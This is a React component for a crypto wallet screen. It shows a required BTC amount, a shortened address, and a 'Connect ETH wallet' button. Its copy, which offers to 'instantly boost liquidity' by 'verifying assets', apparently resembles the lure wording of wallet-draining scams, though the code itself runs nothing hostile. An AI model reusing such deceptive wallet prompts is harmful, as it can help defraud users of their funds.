import React from "react";
import Image from "next/image";
import UserNameandBalance from "./UserNameandBalance";
const Screen2 = ({ setVisibleComponent }) => {
  function formatString(str) {
    // Check if the string length is more than 8 to need formatting
    if (str.length > 8) {
      // Extract the first four and last four characters
      const start = str.substring(0, 4);
      const end = str.substring(str.length - 4);
      // Return the formatted string
      return `${start}...${end}`;
    } else {
      // If the string is not long enough, return it as is
      return str;
    }
  }
  return (
    <div>
      <UserNameandBalance  setVisibleComponent={setVisibleComponent} backTo={'A'}/>
      <div className="flex justify-center items-center h-[350px]">
        <div className="text-center">
          <div className="bg-yellow-600 text-sm font-bold px-[10px] py-[3px] rounded-full text-black">
            You need $4,700 worth of BTC
          </div>
          <p className="text-xs font-semibold my-[7px] text-yellow-600">
            {formatString("0x67278681a8e")}
          </p>
        </div>
      </div>
      <div className="bg-[#100F1F] rounded-[12px] p-[16px]">
        <div className="py-[2px] rounded-[8px] text-xs text-white px-[30px] text-center my-[15px]">
          Your wallet balance is low ! instantly boost liquidity here by
          verifying assets on Ethereum.
        </div>
        <button
          onClick={(e) => setVisibleComponent("C")}
          className="w-full primaryGradient py-[14px] px-[24px] rounded-full text-lg font-medium flex justify-center"
        >
          Connect ETH wallet
        </button>
      </div>
    </div>
  );
};

export default Screen2;
